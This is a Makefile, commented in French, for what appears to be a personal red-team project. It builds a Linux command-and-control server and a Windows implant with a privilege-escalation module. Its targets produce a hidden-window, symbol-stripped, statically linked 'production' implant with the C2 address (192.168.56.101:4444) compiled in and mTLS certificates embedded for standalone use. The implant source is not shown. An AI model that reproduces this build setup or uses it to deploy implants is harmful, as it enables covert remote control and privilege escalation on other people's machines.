# Makefile — C2 server (Linux) + implant (Windows/MSYS2)
#
# ── Arborescence ──────────────────────────────────────────────────────────────
#   src/controller/server/   → C2 server (c2_server.c) + TLS partagé (tls.c/h)
#   src/implant/             → Implant (implant.c) + privesc (privesc.c/h)
#
# ── Prérequis ──────────────────────────────────────────────────────────────────
#   C2 Ubuntu : sudo apt install gcc libssl-dev openssl -y
#
# ── Cibles ─────────────────────────────────────────────────────────────────────
#   make server               → c2_server       (Linux, multi-client)
#   make implant              → implant.exe     (MSYS2, sans fenêtre, prod)
#   make implant-debug        → implant_debug.exe (MSYS2, avec console, debug)
#   make implant-standalone   → implant.exe     (MSYS2, certs embarqués, sans fenêtre)
#   make embed                → génère embedded_certs.h depuis certs/
#   make certs [C2_IP=…]      → génère les certificats mTLS dans certs/
#   make clean

CC      = gcc
CFLAGS  = -Wall -Wextra
LIBS    = -lssl -lcrypto

C2_IP   ?= 192.168.56.101
C2_PORT ?= 4444

# Chemin relatif vers les sources de l'implant
IMPLANT_DIR = ../../implant

# Libs Windows communes à l'implant
WIN_LIBS = -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32

.PHONY: all server implant implant-debug implant-standalone embed certs clean

all: server

server: c2_server.c tls.c tls.h
	$(CC) $(CFLAGS) -O2 -o c2_server c2_server.c tls.c $(LIBS) -lpthread
	@echo "[+] c2_server compilé (multi-client)"

# Production : -mwindows = aucune fenêtre visible, -s = strip des symboles
implant: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h
	gcc $(CFLAGS) \
		-I. -I$(IMPLANT_DIR) \
		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
		-o implant.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
		$(WIN_LIBS) -static -s -mwindows
	@echo "[+] implant.exe généré ($(C2_IP):$(C2_PORT)) — sans fenêtre, nécessite .env + certs/"

# Debug : pas de -mwindows (console visible), pas de -s (symboles conservés)
implant-debug: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h
	gcc $(CFLAGS) \
		-I. -I$(IMPLANT_DIR) \
		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
		-o implant_debug.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
		$(WIN_LIBS) -static
	@echo "[+] implant_debug.exe généré ($(C2_IP):$(C2_PORT)) — avec console debug"

embed: gen-embed.sh
	bash gen-embed.sh certs
	@echo "[+] embedded_certs.h généré"

# Standalone : certs embarqués + sans fenêtre
implant-standalone: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h embedded_certs.h
	gcc $(CFLAGS) \
		-I. -I$(IMPLANT_DIR) \
		-DEMBED_CERTS -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
		-o implant.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
		$(WIN_LIBS) -static -s -mwindows
	@echo "[+] implant.exe standalone généré ($(C2_IP):$(C2_PORT)) — sans fenêtre, zéro dépendance"

certs:
	@bash gen-certs.sh $(C2_IP)

clean:
	rm -f c2_server implant.exe implant_debug.exe embedded_certs.h *.o
